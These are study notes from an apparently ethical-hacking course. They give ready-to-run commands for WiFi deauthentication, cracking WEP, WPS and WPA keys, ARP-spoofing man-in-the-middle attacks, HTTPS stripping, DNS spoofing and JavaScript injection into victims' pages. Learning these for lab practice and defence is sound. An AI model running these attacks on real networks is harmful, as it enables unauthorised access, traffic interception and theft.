## Contents
* [Lab setup](#lab-setup)
* [Network hacking basics](#network-hacking-basics)
  * [Attack types](#attack-types)
  * [MAC (Media Access Control) Address](#mac-address)
  * [Monitor mode](#monitor-mode)
* [Pre-connection attacks](#pre-connection-attacks)
  * [Packet sniffing](#packet-sniffing)
  * [WiFi bands](#wifi-bands)
  * [Targeted packet sniffing](#targeted-packet-sniffing)
  * [Deauthentication attack](#deauthentication-attack)
* [Gaining access (WEP/WPA/WPA2 cracking)](#gaining-access)
  * [WEP cracking](#wep-cracking)
  * [WPA/WPA2 cracking](#wepwpawpa2-cracking)

****

## Lab setup
* Install kali linux.
* Buy an external USB WiFi dongle. Normally internal WiFi adapters do not support monitor mode, packet injections. [Setup USB WiFi adapter on virtual box](https://www.youtube.com/watch?v=RiTICcLH4kU)

## Network hacking basics
### Attack types
  1.	Pre-connection attacks
  2.	Gaining access
  3.	Post-connection attacks

### MAC (Media Access Control) address <a name="mac-address"></a>
#### Features
  * Permanent
  * Unique
  * Physical
  * Assigned by manufacturers
#### Why change MAC address?
  * Increase annonymity
  * Impersonate other devices
  * Bypass filters
#### Change MAC address
Say, we want to change the MAC address of wlan0 interface. wlan0 will be used in further sections as wireless interface name.
```
ifconfig (check present MAC address)
ifconfig wlan0 down (disable interface)
ifconfig wlan0 hw ether 00:11:22:33:44:55 (change)
ifconfig wlan0 up (enable again)
```
Restarting computer will reset the MAC address again.
### Monitor mode
Allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel.
Only applies to wireless networks. Monitor mode is one of the eight modes that 802.11 wireless cards can operate in: Master 
(acting as an access point), Managed (client, also known as station), Ad hoc, Repeater, Mesh, Wi-Fi Direct, TDLS and Monitor mode.
#### Change to monitor mode
```
iwconfig (check only wireless interfaces)
ifconfig wlan0 down (disable interface)
airmon-ng check kill (kill all associated process; not mandatory)
iwconfig wlan0 mode monitor (change to monitor mode)
ifconfig wlan0 up (enable interface)
```
Alternative method.
```
airmon-ng check kill
arimon-ng start wlan0 (change to monitor mode)
```

## Pre-connection attacks
### Packet sniffing
#### airodump-ng
* Part of aircrack-ng suit
* airodump-ng is a packet sniffer
* Used to capture all packets in range
* Display detailed info about networks around us
#### List networks running airodump-ng
Enable monitor mode and run following.
```
airodump-ng wlan0 (wlan0: monitor interface)
```
#### Related terminologies
* BSSID: MAC address of the target network
* PWR: Signal strength
* Beacons: Packets sent by the network in order to broadcast it's existance
* #Data: Number of data packets collected
* #/s: Number of data packets collected in the past 10 seconds
* CH: Channel number
* MB: Maximum speed supported by the network
* ENC: Encryption type
* CIPHER: Cipher type
* AUTH: Authentication type
* ESSID: Name of the network
### WiFi bands
#### Features
* Decides the frequency range that can be used.
* Determines the channels that can be used.
* Clients need to support bands to communicate with the router.
#### Most common WiFi bands
* a: 5GHz
* b, g: 2.4GHz
* n: 2.4GHz and 5GHz
* ac: lower than 6GHz
#### Listen to specific band
```
airodump-ng --band a wlan0 (bands: a, b, g)
```
For multiple bands: e.g. `--band abg`
### Targeted packet sniffing
```
airodump-ng --bssid [BSSID] --channel [CH] --write [filename] wlan0
```
Files will be created with .csv, .netxml, .cap extensions. Where .cap is capture file. Can be opened with wireshark. .cap file cantains captured packets.
### Deauthentication attack
Disconnect any client from any network.
* Works on encrypted networks (WEP, WPA and WPA2).
* No need to know the network key.
* No need to connect to the network.
#### Run
```
iwconfig wlan0 channel [CH] (set channel number same as router)
aireplay-ng --deauth [#DeauthPackets] -a [NetworkMAC] -c [TargetMAC] wlan0
```
Where
* #DeauthPackets: Number of deauthentication packets. 0 will represent infinite number of deauth attacks.
* NetworkMAC: Router MAC address
* TargetMAC: Client MAC address

## Gaining access (WEP/WPA/WPA2 cracking) <a name="gaining-access"></a>
### WEP cracking
#### Features
* Wired Equivalent Privacy
* Old encryption
* Uses an algorithm called RC4.
* Still used in some networks.
* Can be cracked easily.
#### Process
* Client encrypts data using a key.
* Encrypted packet sent in the air.
* Router decrypts packet using the key.
#### Encryption method
* Each packet is encrypted using a unique key stream.
* Random initialization vector (IV) is used to generate the key streams.
* The initialization vector is only 24 bits.
* IV + key (password) = key stream
#### Vulnerability
* IV is too small (only 24 bits)
* IV is sent in plain text
#### Result
* IV will repeat on busy networks
* This makes WEP vulnerable to statistical attacks
* Repeated IV can be used to determine the key stream and break the encryption
#### Crack: basic  case
First need to capture sufficient number of packets. Need long time of no heavy traffic.
```
airodump-ng --bssid [NetworkMAC] --channel [CH] [filename] wlan0
```
Anslyse .cap and crack!
```
aircrack-ng filename.cap
```
#### Crack: fake authentication
Usually access point only communicate with authenticated clients. So attacker need to associate with the AP before launching the attack.

Start capturing.
```
airodump-ng --bssid [NetworkMAC] --channel [CH] --write [filename] wlan0
```
Fake auth attack. To associate with the router so that router communicate with hacker.
```
aireplay-ng --fakeauth 0 -a [NetworkMAC] -h [HackerMAC] wlan0
```
ARP request replay. Wait for an ARP packet. Capture it and replay it. This causes the AP to produce another packet with a new IV. Keep doing this untill we have enough IVs to crack the key.
```
aireplay-ng --arpreplay -b [NetworkMAC] -h [HackerMAC] wlan0
```
airodump-ng capturing may go on. Crack with following command.
```
aircrack-ng filename.cap
```
### WPA/WPA2 cracking <a name="wepwpawpa2-cracking"></a>
#### WPS feature exploiting
##### Requirements
* WPS enabled
* Router is configured not to use PBC (Push Button Authentication)
##### Features
* 8 digit pin cracking
* Need relatively short time to try all pins
* WPS pin can be used to compute the actual password
##### Cracking steps
Step 1: To scal WPS routers run the following command.
```
wash -i wlan0
```
Step 2: Fake authentication attack. Delay will be 30 seconds. Keep on.
```
aireplay-ng --fakeauth [delay] -a [NetworkMAC] -h [HackerMAC] wlan0
```
Step 3: Crack WPS using reaver.
```
reaver --bssid [NetworkMAC] --channel [CH] --interface wlan0 -v --no-associate
```
Where
* --no-associate: associate is the process of fake authentication which is done by aireplay-ng, more robust.
#### Crack using WPA handshake packets
Step 1: Capture packets.
```
airodump-ng --bssid [NetworkMAC] --channel [CH] --write [filename] wlan0
```
Step 2: To capture handshake packets. Deauth attack. So that when reconnect, handshake packets will be generated.
```
aireplay-ng --deauth 4 -a [NetworkMAC] -c [TargetMAC] wlan0
```
Step 3: Generate wordlist.
```
crunch [min] [max] [characters] -t [pattern] -o [wordlistfilename]
```
Example: `crunch 6 8 123abc -t a@@@@b -o test.txt`
Step 4: Crack with the wordlist.
```
aircrack-ng filename.cap -w [wordlistfilename]
```

## Post-connection attacks
### Gathering information
#### Using netdiscover
```
netdiscover -r 192.168.0.1/24
```
#### Using nmap
Ping scan.
```
nmap -sn 192.168.0.1/24
```
Quick scan. Show open ports.
```
nmap -T4 -F 192.168.0.1/24
```
Quick scan plus. Show services and services versions, OS etc.
```
nmap -sV -T4 -O -F --version-light 192.168.0.1/24
```
Try more profiles in zenmap.
### Man in the Middle (MITM)
#### Using arpspoof
##### ARP spoofing (arpspoof)
To fool the victim.
```
arpspoof -i wlan0 -t [targetIP] [routerIP]
```
To fool the router.
```
arpspoof -i wlan0 -t [routerIP] [targetIP]
```
Keep running both commands.

Enable port forwarding.
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
#### Using bettercap
##### Start
```
bettercap -iface wlan0
```
What to do: type `help` or `help module_name`

##### Probing
Keep probing for new hosts.
```
net.probe on
net.recon on
```
To see hosts list.
```
net.show
```
##### ARP spoofing (bettercap)
```
set arp.spoof.fullduplex true
set arp.spoof.targets [targetIP]
arp.spoof on
```
##### Data sniffing
```
net.sniff on
```
##### Using caplet
All commands can be run in a caplet file. e.g. for sniffing.
```
net.probe on
net.recon on
set arp.spoof.fullduplex true
set arp.spoof.targets [targetIP]
arp.spoof on
set net.sniff.local true
set net.sniff.output outputfile.cap (to open in wireshark)
net.sniff on
```
and save as e.g. sniffing.cap

Run `bettercap -iface wlan0 -caplet filename.cap`
##### Bypassing HTTPS
Run `bettercap -iface wlan0 -caplet sniffing.cap` to start sniffing.

And then run `hstshijack/hstshijack` (the caplet does not work perfectly so Zaid provided modified hstshijack)

If a website is HSTS enabled, bypassing HTTPS will not work.
##### DNS spoofing
Run `bettercap -iface wlan0 -caplet sniffing.cap` to start sniffing.

Then run the following.
```
set dns.spoof.all true
set dns.domains example.com
dns.spoof on
```
##### Inject javascript code
Say, javascript file location: /root/test.js

Edit /usr/share/bettercap/caplets/hstshijack.cap. Add following.
```
set hstshijack.payloads *:/root/test.js
```
* to execute in all pages

Then follow bypassing HTTPS procedure.


Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)











